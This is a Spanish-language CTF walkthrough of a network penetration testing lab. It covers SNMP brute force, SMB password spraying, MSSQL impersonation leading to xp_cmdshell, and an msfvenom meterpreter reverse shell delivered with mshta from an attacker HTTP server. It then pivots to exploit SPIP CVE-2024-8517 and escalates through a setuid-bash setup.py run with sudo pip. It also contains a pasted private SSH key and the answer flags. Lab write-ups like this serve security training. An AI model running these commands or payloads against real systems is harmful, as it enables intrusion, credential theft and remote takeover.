# Network Penetration Testing CTF

## Task 1: Leverage SNMP to uncover a user with access to a sensitive share on server.prod.local

Use SNMP to identify a user with access to a sensitive share on **server.prod.local**. Locate the first flag within this share.

___

En esta ocasión nos vamos a crear el siguiente script: 

```
for community in $( cat /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt); do  
echo "Intentando con la cadena de comunidad: $community "  
snmpwalk -v2c -c $community server.prod.local | head -10  
done
```

Este script lo que hace una fuerza bruta al dominio para saber que pass funciona. 

<p align="center"> 
<img src="images/blue.png" width="600" alt="Resultado de Nmap">
</p>

La contraseña encontrada es **blue**, luego intentamos el siguiente comando:

```
snmpwalk -v2c -c blue server.prod.local 1.3.6.1.4.1.311.1.1.3.1.2
```

* **snmpwalk**: su función es "caminar" por el árbol de información. En lugar de pedir un solo dato:
* **-v2c**: Es la más común. Permite pedir tablas de datos grandes de golpe. Su seguridad es básica (basada en texto plano).
* **1.3.6.1.4.1.311.1.1.3.1.2**: Esos números son la prueba de que el servidor está "hablando de más". Has pasado de tener una dirección IP anónima a tener un **listado de cuentas reales** listas para ser atacadas o auditadas.

<p align="center"> 
<img src="images/timothy.png" width="600" alt="Resultado de Nmap">
</p>

Una vez obtenido unos de los usuarios del dominio **timothy** , realizamos el siguiente comando:

```
crackmapexec smb server.prod.local -u timothy -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

<p align="center"> 
<img src="images/jordan.png" width="600" alt="Resultado de Nmap">
</p>

Las credenciales obtenidas son: **timothy**:**jordan**

Por ultimo necesitamos saber el nombre de la carpeta compartida:

```
snmpwalk -v2c -c blue server.prod.local 1.3.6.1.4.1.77.1.2.27 
```

<p align="center"> 
<img src="images/secrets.png" width="600" alt="Resultado de Nmap">
</p>

Una vez obtenida todas las piezas del puzzle del rompe cabeza, haremos lo siguiente: 

```
smbclient //server.prod.local/secrets -U timothy
get flag1.txt
```

<p align="center"> 
<img src="images/Flag1.txt.png" width="600" alt="Resultado de Nmap">
</p>

answer: **4e473af6022f40308cad8c99ab798f01**

## Task 2: Obtain a shell on server.prod.local

Gain shell access on **server.prod.local**. Locate the second flag in the C drive.

Las credenciales se encuentra en la carpeta compartida secret, que se llama mssql_creds.txt 

Accedemos a la bbdd:

```
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py timmy:def_32121_@#@server.prod.local
```

Ingresamos los siguientes comandos en la bbdd:

```
select distinct b.name from sys.server_permissions a INNER JOIN sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'IMPERSONATE';
```

Este comando lo encontramos en el módulo **MSSQL DB User Impersonation to RCE**. 
Este comando sirve para saber quién tiene permiso para suplantar a otros usuarios.

<p align="center"> 
<img src="images/sa.png" width="600" alt="Resultado de Nmap">
</p>

```
execute as login = 'sa'
```

Si un usuario malintencionado tiene el permiso de IMPERSONATE sobre un usuario que sí es sysadmin, ese usuario puede "saltar" y obtener control total del servidor mediante el comando EXECUTE AS.

```
select system_user
```

<p align="center"> 
<img src="images/saaa.png" width="600" alt="Resultado de Nmap">
</p>

Observamos que somos ahora sa

```
enable_xp_cmdshell
```

Este comando nos abre una shell

<p align="center"> 
<img src="images/shell.png" width="600" alt="Resultado de Nmap">
</p>

Por un lado preparamos el puerto de escucha en metasploit:

```
msfconsole -q
use exploit/multi/handler
set LHOST <ip-atacante>
set LHOST 4444
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

<p align="center"> 
<img src="images/mestasploit.png" width="600" alt="Resultado de Nmap">
<img src="images/puerto de escucha.png" width="600" alt="Resultado de Nmap">
</p>

Una vez preparado el puerto de escucha, por otro lado, preparamos un archivo msfvenom para conseguir la revershell de la maquina objetivo

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.37.4 LPORT=4444 -f hta-psh -o reverse.hta
```

Tiene la extensión .hta porque es el que acepta la máquina objetivo y es lo que usaremos para colarnos en su sistema. Compartimos el archivo.

```
python3 -m http.server 8181
```

Volvemos a la bbd y ejecutamos el comando para obtener la shell por metasploit

```
exec xp_cmdshell "mshta.exe http://10.10.37.4:8181/reverse.hta"
```

`mshta.exe` es una herramienta muy utilizada en ataques de **"Fileless Malware"** (malware sin archivos) o técnicas de **Living off the Land (LotL)**. Los atacantes lo prefieren porque:

1. **Es un binario firmado por Microsoft:** Muchos antivirus confían en él por defecto.
2. **Evade filtros:** Puede ejecutar scripts maliciosos directamente desde una URL o una línea de comandos, sin necesidad de guardar un virus en el disco duro.
3. **Suplantación:** A veces, los virus se nombran `mshta.exe` pero se ubican en carpetas temporales para engañar al usuario.

Volvemos a metasploit, si lo hemos echo bien , en unos segundos obtenemos la reverse shell.

<p align="center"> 
<img src="images/conexion hecha.png" width="600" alt="Resultado de Nmap">
</p>

Buscamos la flag2.txt

```
shell
powershell
cd /
type flag2.txt
```

<p align="center"> 
<img src="images/flag2.txt.png" width="600" alt="Resultado de Nmap">
</p>

answer: **f83e9da3ee4b4ec1a62594f2de1da79d**

## Task 3: Gain elevated privileges on server.prod.local

Escalate privileges on **server.prod.local** to gain higher-level access. Locate the third flag on the Administrator's desktop.

```
getsystem
```

Usamos este comando para obtener los máximos privilegios

```
cd C:\users\administrator\Desktop
type flag3.txt
```

<p align="center"> 
<img src="images/flag3.txt.png" width="600" alt="Resultado de Nmap">
</p>

answer: **7af361f0d0d24baaaeb4723c81a0e11a**

## Task 4: Exploit a vulnerable application on web.prod.local

A vulnerable application is running on **web.prod.local**, which is not directly accessible from Kali. Use your foothold to exploit this application and compromise the system. Locate the fourth flag in the system's root directory.

Obtenemos la ip porque hacemos ping a web.prod.local desde la maquina atacante.

```
ping web.prod.local
```

<p align="center"> 
<img src="images/ip webprod.png" width="600" alt="Resultado de Nmap">
</p>

Luego comprobamos si en la maquina que estamos hay ping 

```
ping 10.2.31.233
```

<p align="center"> 
<img src="images/ping 10.2.31.33.png" width="600" alt="Resultado de Nmap">
</p>

Dentro de la maquina que hemos obtenido meterpreter hay conexion con esa ip. Por tanto vamos a enrutarlo. Para salir de la sesión de powershell le damos **control +z** 

```
run autoroute -s 10.2.16.0/20
```

Como obtenemos la ip **10.2.16.0/20** que viene **10.2.31.233** se debe al resultado de aplicar una máscara de subred que define un rango de direcciones mediante lógica binaria. Al operar con un prefijo `/20`, la red se organiza en bloques de 16 unidades en el tercer octeto, lo que significa que todas las direcciones desde la **10.2.16.0** hasta la **10.2.31.255** forman parte de la misma vecindad lógica; por tanto, aunque los números decimales parezcan diferentes, el "código postal" binario que define su origen es exactamente el mismo.

```
background
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
exploit
jobs
```

<p align="center"> 
<img src="images/jobss.png" width="600" alt="Resultado de Nmap">
</p>

Esto significa que hemos conseguidos trasladar **web.prod.local** a nuestra maquina atacante, tendremos que usar **proxychains** para detectarlo.

```
proxychains nmap web.prod.local -sT -Pn -sV -p 80
```

<p align="center"> 
<img src="images/puerto 80 abierto.png" width="600" alt="Resultado de Nmap">
</p>

Para poder visualizarlo, nos tenemos que ir al **navegador** - **settings** - **proxy**

<p align="center"> 
<img src="images/proxy.png" width="600" alt="Resultado de Nmap">
</p>

La pagina en cuestión

<p align="center"> 
<img src="images/spip.png" width="600" alt="Resultado de Nmap">
</p>

Me gustaria saber la version del cms 

```
proxychains whatweb http://web.prod.local/   
```

<p align="center"> 
<img src="images/4.3.11.png" width="600" alt="Resultado de Nmap">
</p>

La version del SPIP es 4.3.1 por tanto Encuentro un exploit en este [git hub](https://github.com/saadhassan77/SPIP-BigUp-Unauthenticated-RCE-Exploit-CVE-2024-8517)

<p align="center"> 
<img src="images/PRemioo.png" width="600" alt="Resultado de Nmap">
</p>

Este exploit cumple la condición, copiamos el exploit.py a nuestra maquina atacante y le damos permiso de ejecución.

```
proxychains python3 exploit.py http://web.prod.local 
```

<p align="center"> 
<img src="images/whoami.png" width="600" alt="Resultado de Nmap">
</p>

La cosa es que estamos antes una shell semi-interactiva por tanto realizar una reverse shell no va a funcionar, por tanto para conseguir la siguiente flag haremos lo siguiente. 

```
cd ../../.. && cat flag4.txt
```

answer: **7dcaff019c5240378ad35d8b26a12e6b**

## Task 5: Examine a user's .plan file on web.prod.local for a privilege escalation opportunity

Analyze a user's .plan file on **web.prod.local** to uncover a potential path for privilege escalation. Locate the fifth flag in the root user's home directory.

Investigando en un foro, comenta que hay un id_rsa del usuario auditor, y lo encontramos con el siguiente comando.

```
find /var/opt/.backups -type f | xargs ls -l
cat /var/opt/.backups/auditor/priv_key
```

>-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

Copiamos el id_rsa en nuestra maquina atacante y le damos permiso de usuario **chmod 600 idrsa**. Hasy que tener en cuenta que el puerto 22 esta abierto, por eso podemos llevar acabo la siguiente intrusión.

```
proxychains ssh -i idrsa auditor@web.prod.local
```

Escalamos privilegio usando el siguiente comando:

```
sudo -l
```

<p align="center"> 
<img src="images/sudo -l.png" width="600" alt="Resultado de Nmap">
</p>

dentro de **/tmp** creamos el siguiente script con el nombre **setup.py**

```bash
from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        # Esto da permisos de superusuario a la bash para que cualquiera la use
        os.system("cp /bin/bash /tmp/rootbash")
        os.system("chmod +s /tmp/rootbash")
        install.run(self)

setup(name="exploit",
      version="0.1.1", # Sube la versión para que pip no proteste
      cmdclass={'install': CustomInstall})
```

luego lo ejecutamos ```

```
sudo /usr/bin/pip install . --upgrade --force-reinstall --no-binary :all:
```

y luego por ultimo:

```
/tmp/rootbash -p
```

<p align="center"> 
<img src="images/root.png" width="600" alt="Resultado de Nmap">
</p>

Dentro de la carpeta de **root** encontraremos la última flag5.txt

answer: **a9c6524794414d66bda36591be8fc426**